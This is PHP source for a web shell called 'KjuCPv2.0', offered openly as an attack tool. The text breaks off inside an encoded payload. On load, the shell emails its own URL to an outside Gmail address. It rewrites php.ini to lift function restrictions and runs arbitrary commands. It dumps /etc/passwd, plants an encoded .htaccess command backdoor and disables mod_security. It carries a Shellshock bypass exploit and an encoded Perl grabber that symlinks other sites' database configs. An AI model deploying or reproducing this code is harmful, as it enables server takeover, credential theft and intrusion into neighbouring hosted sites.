<?php 
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$body=("Shell: http://".$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI']." "."Directory".dirname(__FILE__));
mail('wildt00lz@gmail.com',$_SERVER['SERVER_ADDR'],$body);
 
$base_url = 'http://'.$_SERVER['REQUEST_URI'].dirname($_SERVER['SCRIPT_NAME']);
$byphp = "safe_mode = Off
		disable_functions = None
		";
file_put_contents("php.ini",$byphp);
echo '</head><body>';
echo "
<html>
<head>
<style type='text/css'>
@import url('https://fonts.googleapis.com/css?family=Fenix');
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Fenix';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
.wildc {
	color:#4B0082;
}
table, th, td {
	border-collapse:collapse;
	background: transparent;
	font-family: 'Fenix';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
b {
	color: #4B0082;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Fenix';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 50%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Fenix';
	font-size: 13px;
}

#terma {
      color:black;
}
#kernel {
color :white;
}
#exec {
      
      color:#4B0082;
}
#zeb {

      width: 525px;
      height: 301px;
      color:black;
}
input[type=submit] {
background-color : black;
color:white;
}
a:hover{
border-bottom:1px solid black;
}
*{
	font-size:16px;
	font-family:Courier,Courier,Courier;
	color:white;
}
#menu a{
	padding:4px 18px;
	margin:0;
	background:green;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;

}
#menu2 a{
	padding:4px 18px;
	margin:0;
	background:#4B0082;
	text-color:black;
	text-decoration:none;
	letter-spacing:2px;
	-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 3px; border-radius: 3px;

}
</style>

<title>KjuCPv2.0</title>
</head>
<br><center><div id=menu2>
<a href=?home>Home</a>
<a href=?config>Config</a>
<a href=?wpmass>WP MASS</a>
<a href=?upl>Upload</a>
<a href=?mass>Mass</a>
<a href=?unzip>Unzip</a>
<a href=?vhost>Vhost</a>

</div></center>
<p>
<center>
<img src=http://i.imgur.com/8wnB1ZU.jpg width=260 height=300 /><br /></center><br><center><div id=menu2>
<a href=?jump>Jumping</a>
<a href=?pws>Config Password</a>
<a href=?x=symlink>Symlink</a>
<a href=?cmd>CMD</a>
<a href=?delivery>Delivery</a>
<a href=?cp_cracker>cPanel Cracker</a>
</div></center>

<br><br><center><font color='white'><br></font>";
if(isset($_GET["home"])){
	
echo "<body bgcolor=black>";
echo "<font color=green>";
echo "<title>whoami@system:~$ no system is safe !</title>";
$system = php_uname() ;
$software = getenv("SERVER_SOFTWARE");
$kontol = @gethostbyname($_SERVER["HTTP_HOST"]);
$babi = $_SERVER['REMOTE_ADDR'];
function jembotmawot() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:'><font color=white>".$disablefunc."</font></span>"; }
    else { return "<span style='color:red'>Nothing Bitch!</span>"; }
    }
	
function showstat($stat) {if ($stat=="on") {return "<font style='color:white'>ON</font>";}
else {return "<font style='color:red'>OFF</font>";}}
function testkontol() {if (exec('perl -h')) {return showstat("on");}else {return showstat("off");}}
function testmemek() {if (exec('wget --help')) {return showstat("on");}else {return showstat("off");}}
function testmysql() {if (function_exists('mysql_connect')) {return showstat("on");}else {return showstat("off");}}
function testcurl() {if (function_exists('curl_version')) {return showstat("on");}else {return showstat("off");}}
function testoracle() {
    if (function_exists('ocilogon')) { return showstat("on"); }
    else { return showstat("off"); }
    }
function testmssql() {
    if (function_exists('mssql_connect')) { return showstat("on"); }
    else { return showstat("off"); }
    }
if ($itil == "") 
{
echo "System : ".$system. "</br>";
echo "Software : ".$software."<br/>";
echo "Server : ".$kontol." | You : ".$babi."</br>";
echo "$buff .= $letters . '&nbsp;&gt;&nbsp;; . $pwdurl;";
echo "Disabled Functions: ".jembotmawot()."<br />";
echo "MySQL : ".testmysql()." | Oracle : ".testoracle()." | MSSQL : ".testmssql()." | Curl : ".testcurl()." | WGet : ".testmemek()." | Perl : ".testkontol();
}
else if($itil == 'crot'){
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" 

value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'Uploaded !!'; }
	else { echo 'Upload Fail !!'; }
}
}
else
{
$memek = null;
exec($itil, $memek);
echo "<pre>" . var_export($memek,true) . "</pre>";
echo "kjubi.wildclique@gmail.com";
}
}
if(isset($_GET["byppass"])){
echo "<br><br><br><br>";
    echo '<center>Bypass <font class="wildc">etc/passwd</font> With:<br><br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>   
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>       
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass <font class="wildc">User</font> With :<br> <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>   
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>       
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';
echo '<center><font class="wildc">Safe Mode</font> AND <font class="wildc">Mod Security Disabled</font> AND <font class="wildc">PERL 500 INTERNAL ERROR BYPASS</font><br><br><br>Following <font class="wildc">php.ini</font> and <font class="wildc">.htaccess(mod)</font> and perl(<font class="wildc">.htaccess</font>)[convert perl extention <font class="wildc">*.pl => *.sh</font>  ] files create in following dir</p1><br><br><table style="width: 30%;"><tr><td><form method="post"><input type="submit" value="php.ini" style="width: 100%;" name="phpini"></form></td><td><form method="post"><input type="submit" value=".htaccess" style="width: 100%;" name="htaccessmod"></form></td><td><form method="post"><input type="submit" value=".htaccess(perl)" style="width: 100%;" name="htaccessperl"></form></td><td><form method="post" ><input type="submit" value=".htaccess(shell backdoor)" style="width: 100%;" name="htaccessbd"></form></td></tr></table><br>';
if(isset($_POST['phpini'])){
        $phpini = "safe_mode=OFF\ndisable_functions=NONE\nsafe_mode_gid=OFF\nopen_basedir=OFF\nallow_url_fopen=ON";
        $spadephp = fopen($GLOBALS['cwd']."php.ini", "w");
        $sulat1 = fwrite($spadephp, $phpini); if(!$sulat1){ echo "<br><font color=red>Unable to Generate PHP.INI</font>";}else{ echo "<br><font color=lime>PHP.INI Generated Successfully!</font>";}
        fclose($spadephp);
    }
    if(isset($_POST['htaccessmod'])){
        $htmod = "<IfModule mod_security.c>\nSecFilterEgine Off\nSecFilterScanPOST Off\nSecFilterCheckURLEncoding Off\nSecFilterCheckUnicodeEncoding Off\n</IfModule>";
        $spademod = fopen($GLOBALS['cwd'].".htaccess", "w");
        $sulat2 = fwrite($spademod, $htmod); if(!$sulat2){ echo "<br><font color=red>Unable to Generate .HTACCESS</font>";}else{ echo "<br><font color=lime>.HTACCESS Generated Successfully!</font>";}
        fclose($spademod);
    }
    if(isset($_POST['htaccessperl'])){
        $htperl = "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .sh\nAddHandler cgi-script .pl\nAddHandler cgi-script .pl";
        $spadeperl = fopen($GLOBALS['cwd'].".htaccess", "w");
        $sulat3 = fwrite($spadeperl, $htperl); if(!$sulat3){ echo "<br><font color=red>Unable to Generate .HTACCESS(Perl)</font>";}else{ echo "<br><font color=lime>.HTACCESS(Perl) Generated Successfully!</font>";}
        fclose($spadeperl);
    }
    if(isset($_POST['htaccessbd'])){
        $htbd = base64_decode("PEZpbGVzIH4gIl5cLmh0Ij5cbk9yZGVyIGFsbG93LGRlbnlcbkFsbG93IGZyb20gYWxsXG48L2ZpbGVzPlxuQWRkVHlwZSBhcHBsaWNhdGlvbi94LWh0dHBkLXBocCAuaHRhY2Nlc3NcbiMgPD9waHAgcGFzc3RocnUoJF9HRVRbJ2NtZCddKTs/Pg==");
        $spadebd = fopen($GLOBALS['cwd'].".htaccess", "w");
        $sulat4 = fwrite($spadebd, $htbd); if(!$sulat4){ echo "<br><font color=red>Unable to Generate .HTACCESS(Shell)</font>";}else{ echo "<br><font color=lime>.HTACCESS(Shell) Generated Successfully!</font>";}
        fclose($spadebd);
    }
echo "<center><table style='width: 50%;'><tr><font class='wildc'>Byppass Chmod Dir</font> & <font class='wildc'>File Priv8</font><br><form method='post'><td><input type='text' name='link3rx' style='width: 100%;' placeholder='ex: ".$dir."'></td></tr><tr><td><input type='submit' value='BYPASS CHMOD DIR'></td></form></tr></table><br>";

    if(isset($_POST['link3rx'])){
        $spade = $_POST['link3rx'];
        $ch = @chmod($spade,'0311');
        if($ch){ echo "<br><font color='lime'>Directory [".$spade."] Successfully Bypassed!</font>"; }else{ echo "<br><font color='red'>Directory [".$spade."] Failed to Bypass!</font>";}
        echo "</center>";
    }
echo "<center><table style='width: 50%;'><tr>PHP 5.X <font class='wildc'>Shellshock Exploit</font> (BYPASS DISABLE_FUNCTION)<br><form method='post'><td><input type=text name='shellshock' style='width: 100%;'></td></tr><tr><td><input type=submit value='SHELLSHOCK'><br></td></tr></table><br>";
if(isset($_POST['shellshock'])){
    function shellsh0ck($kewl){
       /*if(strstr(readlink("/bin/sh"), "bash") != FALSE){
            $tmp = tempnam(".", "data");
            putenv("PHP_LOL=(){ x; }; $kewl >$tmp 2>&1");
            mail("spade@127.0.0.1","","","","-bv");
        }else{
            return "Not Vuln (not bash)";
            $output = @file_get_contents($tmp);
            @unlink($tmp);
            if($output != "") return $output;
            else return "No Output, or Not Vulnerable!";
        }*/
          $file=tempnam("/tmp", "xpl");
          putenv("PHP_XPL=() { :;}; {$kewl}>{$file}");
          mail("spade@localhost", "", "", "", "-bv");
          echo file_get_contents($file);
          unlink($file);
    }
    echo"<textarea class='inputzbut' cols='65' rows='15'>".shellsh0ck($_POST['shellshock'])."</textarea></center><br>";
}

if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
}
if(isset($_GET["unzip"])){
 echo "<center><h1 class='wildc'>WildClique Zip 1.0</h1>";
function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file) {
       if ('.' === $file || '..' === $file) continue;
       if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
       else unlink("$dir/$file");
   }
   rmdir($dir);
}
if($_FILES["zip_file"]["name"]) {
    $filename = $_FILES["zip_file"]["name"];
    $source = $_FILES["zip_file"]["tmp_name"];
    $type = $_FILES["zip_file"]["type"];
    $name = explode(".", $filename);
    $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    foreach($accepted_types as $mime_type) {
        if($mime_type == $type) {
            $okay = true;
            break;
        } 
    }
    $continue = strtolower($name[1]) == 'zip' ? true : false;
    if(!$continue) {
        $message = "Not A Zip File";
    }
  $path = dirname(__FILE__).'/';
  $filenoext = basename ($filename, '.zip'); 
  $filenoext = basename ($filenoext, '.ZIP');
  $targetdir = $path . $filenoext;
  $targetzip = $path . $filename; 
  if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
  mkdir($targetdir, 0777);
    if(move_uploaded_file($source, $targetzip)) {
        $zip = new ZipArchive();
        $x = $zip->open($targetzip); 
        if ($x === true) {
            $zip->extractTo($targetdir);
            $zip->close();
 
            unlink($targetzip);
        }
        $message = "<b>Done!</b>";
    } else {    
        $message = "<b>Failed!</b>";
    }
}   
echo '<table style="width:100%" border="1">
  <tr><td><h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" name="submit" value="Upload And Unzip" />
</form>';
if($message) echo "<p>$message</p>";
echo "</td><td><h2>Zip Backup</h2><form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br><input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/wild_backup.zip' style='width: 450px;' height='10'><br><input type='submit' name='backup' value='BackUp!' style='width: 215px;'></form>"; 
    if($_POST['backup']){ 
    $save=$_POST['save'];
    function Zip($source, $destination)
{
    if (extension_loaded('zip') === true)
    {
        if (file_exists($source) === true)
        {
            $zip = new ZipArchive();

            if ($zip->open($destination, ZIPARCHIVE::CREATE) === true)
            {
                $source = realpath($source);

                if (is_dir($source) === true)
                {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

                    foreach ($files as $file)
                    {
                        $file = realpath($file);

                        if (is_dir($file) === true)
                        {
                            $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                        }

                        else if (is_file($file) === true)
                        {
                            $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                        }
                    }
                }

                else if (is_file($source) === true)
                {
                    $zip->addFromString(basename($source), file_get_contents($source));
                }
            }

            return $zip->close();
        }
    }

    return false;
}
    Zip($_POST['dir'],$save);
    echo "Done , Save To <b>$save</b>";
    }
    echo "</td><td><h2>Unzip Manual</h2><form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br><input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><font style='text-decoration: underline;'>Save To:</font><br><input type='text' name='save' value='$dir/wild_unzip' style='width: 450px;' height='10'><br><input type='submit' name='extrak' value='Unzip!' style='width: 215px;'></form>";
    if($_POST['extrak']){
    $save=$_POST['save'];
    $zip = new ZipArchive;
    $res = $zip->open($_POST['dir']);
    if ($res === TRUE) {
        $zip->extractTo($save);
        $zip->close();
    echo 'Done! , Location : <b>'.$save.'</b>';
    } else {
    echo 'Failed!';
    }
    }
echo '</tr></table>';   
}
elseif(isset($_GET["vhost"])){
echo "<font color='white'>.: Coded by Kjubi | WildClique :.</font><br>
<br>
<a href='http://facebook.com/wildkjubi'>
<img src='http://i40.tinypic.com/20gd109.png' height='400' width='400'>
</a>
<br>
<br>
<font color='white'>.: Priv8 Config Grabber :.</font><br><br>
    <td>
    <table width='100%' height='173'>
     <td class='td' style='border-bottom-width:thin;border-top-width:thin'><form method='post'>
            <div align='center'>
              <input type='submit' name='wildclique' value='GET IT !'>
            </div>
        </form></td>";
        if (isset($_POST['wildclique']))
{
@mkdir('KjuConfig', 0755);
@chdir('KjuConfig');
        $elesem = ".htaccess";
        $elakab = "$elesem";
        $filhat = fopen ($elakab , 'w') or die ("Can't Write htaccess !");
        $htcont = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";   
        fwrite ( $filhat , $htcont ) ;
        fclose ($filhat);
$config = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LUxhbmd1YWdlIiBjb250ZW50PSJlbi11cyIgLz4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPHRpdGxlPi46IFdpbGRDbGlxdWUgR3JhYmJlciB2MC4xOi48L3RpdGxlPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiB1YnVudHU7DQogZm9udC1zaXplOiB4LWxhcmdlOw0KIGNvbG9yOiB3aGl0ZTsNCiBiYWNrZ3JvdW5kLWNvbG9yOiAjMTUxNTE1Ow0KIHRleHQtYWxpZ246IGNlbnRlcjsNCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQonOw0KDQoNCnByaW50ICcNCjxib2R5IGNsYXNzPSJuZXdTdHlsZTEiPg0KPHA+LjogQ29kZWQgYnkgS2p1YmkgfCBXaWxkQ2xpcXVlIDouPC9wPg0KPHA+a2p1Ymkud2lsZGNsaXF1ZUBnbWFpbC5jb208L3A+JzsNCm9wZW5kaXIobXkgJGRpciAsICIvdmFyL3d3dy92aG9zdHMvIik7DQpmb3JlYWNoKHNvcnQgcmVhZGRpciAkZGlyKSB7DQogICAgbXkgJGlzRGlyID0gMDsNCiAgICAkaXNEaXIgPSAxIGlmIC1kICRfOw0KJHNpdGVzcyA9ICRfOw0KDQoNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9vcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcC1vcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9vc2NvbS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictb3Njb20udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictb3Njb21tZXJjZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictb3Njb21tZXJjZXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2hvcC9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2hvcDIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJHNpdGVzcy4nLXNob3Atc2hvcHBpbmcudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkc2l0ZXNzLictc2FsZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkc2l0ZXNzLictYW1lbWJlci50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9jb25maWcuaW5jLnBocCcsJHNpdGVzcy4nLWFtZW1iZXIyLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21lbWJlcnMvY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1tZW1iZXJzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy00aW1hZ2VzMS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkc2l0ZXNzLictZm9ydW0udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvZm9ydW1zL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRzaXRlc3MuJy1mb3J1bXMudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYWRtaW4vY29uZi5waHAnLCRzaXRlc3MuJy01LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2FkbWluL2NvbmZpZy5waHAnLCRzaXRlc3MuJy00LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXdwLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL1dQL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLVdQLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtd3AtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLWJldGEudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtcHJlc3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3Mvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXdvcmRwcmVzcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9Xb3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtV29yZHByZXNzLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cDEzLXdvcmRwcmVzcy1iZXRhLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL25ld3Mvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtbmV3cy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9uZXcvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwMTMtbmV3LnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2Jsb2cvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLWJsb2cudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYmV0YS93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtYmV0YS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9ibG9ncy93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtYmxvZ3MudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvaG9tZS93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtaG9tZS50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9wcm90YWwvd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL3dwLWNvbmZpZy5waHAnLCRzaXRlc3MuJy13cC1zaXRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL21haW4vd3AtY29uZmlnLnBocCcsJHNpdGVzcy4nLXdwLW1haW4udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvdGVzdC93cC1jb25maWcucGhwJywkc2l0ZXNzLictd3AtdGVzdC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9hcmNhZGUvZnVuY3Rpb25zL2RiY2xhc3MucGhwJywkc2l0ZXNzLictaWJwcm9hcmNhZGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvYXJjYWRlL2Z1bmN0aW9ucy9kYmNsYXNzLnBocCcsJHNpdGVzcy4nLWlicHJvYXJjYWRlLnR4dCcpOw0Kc3ltbGluaygnL3Zhci93d3cvdmhvc3RzLycuJHNpdGVzcy4nL2h0dHBkb2NzL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJHNpdGVzcy4nLWpvb21sYTIudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXByb3RhbC50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9qb28vY29uZmlndXJhdGlvbi5waHAnLCRzaXRlc3MuJy1qb28udHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0ZXNzLicvaHR0cGRvY3MvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLWNtcy50eHQnKTsNCnN5bWxpbmsoJy92YXIvd3d3L3Zob3N0cy8nLiRzaXRlc3MuJy9odHRwZG9jcy9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkc2l0ZXNzLictam9vbWxhLXNpdGUudHh0Jyk7DQpzeW1saW5rKCcvdmFyL3d3dy92aG9zdHMvJy4kc2l0